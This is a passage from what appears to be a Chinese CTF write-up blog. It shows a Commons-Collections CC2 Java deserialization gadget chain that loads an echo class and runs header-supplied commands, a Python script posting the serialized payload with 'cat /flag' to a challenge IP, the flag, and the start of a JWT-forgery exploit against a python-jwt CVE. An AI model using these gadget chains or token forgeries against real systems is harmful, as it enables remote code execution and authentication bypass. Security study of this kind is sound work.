function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>writer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>CC2:</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Comparator</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC2</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span><span class="token class-name">String</span> fieldname<span class="token punctuation">,</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldname<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token comment">// 创建 TemplatesImpl 对象加载字节码</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"ysoserial.payloads.evil.SpringEcho"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"ameuu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token comment">// 创建 TranformingComparator 实例</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token class-name">Transformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token comment">// 创建 PriorityQueue 实例</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token comment">//readobject 入口</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token comment">// 修改调用方法为 newTransformer，加载恶意类。</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span><span class="token string">"iMethodName"</span><span class="token punctuation">,</span><span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token class-name">ByteArrayOutputStream</span> baor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baor<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>baor<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token comment">//        // 反序列化</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment">//        ObjectInputStream ois = new ObjectInputStream(bais);</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment">//        Object o = ois.readObject();</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">//        baor.close();</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>python 上传，这里其实也卡了很久，直接上传的时候直接回显 500 然后再去请求头添加 cmd 之后并没有执行，感觉是没有成功，直到后来在自己测试的时候直接 data 和 headers 一起传发现居然成功了，不是很能理解（还是太菜了</p><p>exp:</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://39.106.13.71:18962/myTest'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>data <span class="token operator">=</span> <span class="token string">'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHBwdAAObmV3VHJhbnNmb3JtZXJwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3NxAH4AC0wABV9uYW1lcQB+AApMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADnPK/rq+AAAANAC5CgAvAF8KAGAAYQoAYABiCABjCgBkAGUIAGYHAGcKAAcAaAcAaQoAagBrCABsCABtCABuCABvCABNCgAHAHAIAHEIAE4HAHIKAGoAcwgAUAgAdAoAdQB2CgATAHcIAHgKABMAeQgAeggAewoAEwB8CAB9CAB+CAB/CACACgAJAIEIAIIHAIMKAIQAhQoAhACGCgCHAIgKACQAiQgAigoAJACLCgAkAIwIAI0IAI4HAI8HAJABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIkx5c29zZXJpYWwvcGF5bG9hZHMvZXZpbC9FdmlsVGVzdDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQABYwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABbQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAm0xAQAEcmVzcAEAA3JlcQEACWdldFdyaXRlcgEACWdldEhlYWRlcgEABndyaXRlcgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2NoYXJzZXROYW1lAQANU3RhY2tNYXBUYWJsZQcAjwcAZwcAkgcAaQcAcgcAUwcAkwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDABCAEMHAJQMAJUAlgwAlwCYAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwCZDACaAJsBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwAnACdAQAQamF2YS9sYW5nL09iamVjdAcAkgwAngCfAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACgAJ0BACVqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXF1ZXN0AQAQamF2YS9sYW5nL1N0cmluZwwAoQCiAQAHb3MubmFtZQcAowwApAClDACmAKcBAAZ3aW5kb3cMAKgAqQEAA0dCSwEABVVURi04DACqAKcBAANXSU4BAAIvYwEABy9iaW4vc2gBAAItYwwAqwCsAQAHcHJpbnRsbgEAEWphdmEvdXRpbC9TY2FubmVyBwCtDACuAK8MALAAsQcAsgwAswC0DABCALUBAAJcQQwAtgC3DAC4AKcBAAVmbHVzaAEABWNsb3NlAQAgeXNvc2VyaWFsL3BheWxvYWRzL2V2aWwvRXZpbFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAt0b1VwcGVyQ2FzZQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAAhAC4ALwAAAAAAAwABADAAMQACADIAAAA/AAAAAwAAAAGxAAAAAgAzAAAABgABAAAAEQA0AAAAIAADAAAAAQA1ADYAAAAAAAEANwA4AAEAAAABADkAOgACADsAAAAEAAEAPAABADAAPQACADIAAABJAAAABAAAAAGxAAAAAgAzAAAABgABAAAAFgA0AAAAKgAEAAAAAQA1ADYAAAAAAAEANwA4AAEAAAABAD4APwACAAAAAQBAAEEAAwA7AAAABAABADwAAQBCAEMAAgAyAAACwwAJAA0AAAF7KrcAAbgAArYAAxIEtgAFTCsSBgO9AAe2AAhNLAEDvQAJtgAKTrgAArYAAxILtgAFTCsSDAO9AAe2AAhNKxINA70AB7YACDoELC0DvQAJtgAKOgUZBC0DvQAJtgAKOga4AAK2AAMSDrYABRIPA70AB7YAEDoHuAACtgADEhG2AAUSEgS9AAdZAxITU7YAEDoIGQgEtgAUGQcEtgAUGQcZBQO9AAm2AAo6CRkIGQYEvQAJWQMSFVO2AArAABM6Cga9ABM6CxIWuAAXtgAYEhm2ABqZAAgSG6cABRIcOgwSFrgAF7YAHRIetgAamQASGQsDEhVTGQsEEh9TpwAPGQsDEiBTGQsEEiFTGQsFGQpTGQm2ACISIwS9AAdZAxITU7YAEBkJBL0ACVkDuwAkWbgAJRkLtgAmtgAnGQy3ACgSKbYAKrYAK1O2AApXGQm2ACISLAO9AAe2ABAZCQO9AAm2AApXGQm2ACISLQO9AAe2ABAZCQO9AAm2AApXsQAAAAMAMwAAAG4AGwAAABcABAAaABAAGwAbABwAJQAdADEAHgA8AB8ASAAgAFMAIQBfACIAdQAjAJAAJACWACUAnAAmAKkAJwC+ACgAxAApAN0AKgDtACsA8wAsAPwALgECAC8BCAAxAQ4AMgFKADMBYgA0AXoANQA0AAAAhAANAAABewA1ADYAAAAQAWsARABFAAEAGwFgAEYARwACACUBVgBIAEkAAwBIATMASgBHAAQAUwEoAEsASQAFAF8BHABMAEkABgB1AQYATQBHAAcAkADrAE4ARwAIAKkA0gBPAEkACQC+AL0AUABRAAoAxAC3AFIAUwALAN0AngBUAFEADABVAAAAOAAE/wDZAAwHAFYHAFcHAFgHAFkHAFgHAFkHAFkHAFgHAFgHAFkHAFoHAFsAAEEHAFr8ACAHAFoLADsAAAAEAAEAXAABAF0AAAACAF5wdAAFYW1ldXVwdwEAeHEAfgAReA=='</span></pre></td></tr><tr><td data-num="3"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://39.106.13.71:18962/myTest'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'cmd'</span><span class="token punctuation">:</span> <span class="token string">'cat /flag'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>flag:</p><pre><code>flag&#123;18e4ba5e-7907-44f2-baba-2ac04b6787b4&#125;
</code></pre><h3 id="funweb"><a class="anchor" href="#funweb">#</a> FunWEB</h3><ul><li>flask python-jwt</li></ul><p>直接打开是登录注册界面，猜测可能有 SQL 注入，就是不知道环境是什么，先注册一个账号进去，发现有三个路由 getFlag、graphql、logout</p><p>但是前面两个都需要 admin 登录，查看 cookie 发现有 session 和 token，session 是 flask session，强行解密发现只是用来记录是否登录的。而 token 是 jwt，会记录是不是 admin，那么如果想成为 admin 那就是要找到秘钥了，但是完全没有思路该怎么去找到秘钥，打算从 JWT 攻击入手</p><p>把 token 放到 jwt.io 上看，发现是 PS256 加密，是非对称加密……</p><p>之后就卡了很久很久，甚至还成改成对称加密去爆破秘钥……</p><p><img data-src="https://img-blog.csdnimg.cn/12808644c7c64114b68a497f09118316.png" alt="Untitled"></p><p>python 环境下的 jwt，google 到了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhdmVkb2VzZGV2L3B5dGhvbi1qd3Q="> https://github.com/davedoesdev/python-jwt</span>，可以发现近期刚出一个 CVE，还是关于 token 认证的，那这次的考点应该就是这里了</p><p><img data-src="https://img-blog.csdnimg.cn/f40d965eccdf4d7c9a05460af661ad7c.png" alt="Untitled"></p><p>直接查看详情，可以发现漏洞点是 JWT 解析器和 jwtcrypto 依赖不一致造成的，但还是有点不知道该怎么入手，</p><p><img data-src="https://img-blog.csdnimg.cn/61171b5c778e4b9c9b50b6721581ac7d.png" alt="Untitled"></p><p>查看 commit，在最后有一个 <code>vulnerability_vows.py</code> ，仔细审计一下可以发现这个就是用来测试漏洞是否修复成功的，那从另一方面来说我们就可以利用这和脚本伪造 token</p><p><img data-src="https://img-blog.csdnimg.cn/48e495a6808e435eba0f43cae850d21d.png" alt="Untitled"></p><p>直接将整个最新版的 python-jwt 从 github 上面拿下来，利用里面的 test 包构造 exp，然后在环境里面安装 python-jwt3.3.3：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedelta</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> json <span class="token keyword">import</span> loads<span class="token punctuation">,</span> dumps</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> fixtures <span class="token keyword">import</span> generated_keys</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> python_jwt <span class="token keyword">as</span> jwt</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># from pyvows import Vows, expect</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> jwcrypto<span class="token punctuation">.</span>common <span class="token keyword">import</span> base64url_decode<span class="token punctuation">,</span> base64url_encode</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">fakePayload</span><span class="token punctuation">(</span>topic<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token triple-quoted-string string">""" Use mix of JSON and compact format to insert forged claims including long expiration """</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment"># print(topic)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">[</span>header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> topic<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    parsed_payload <span class="token 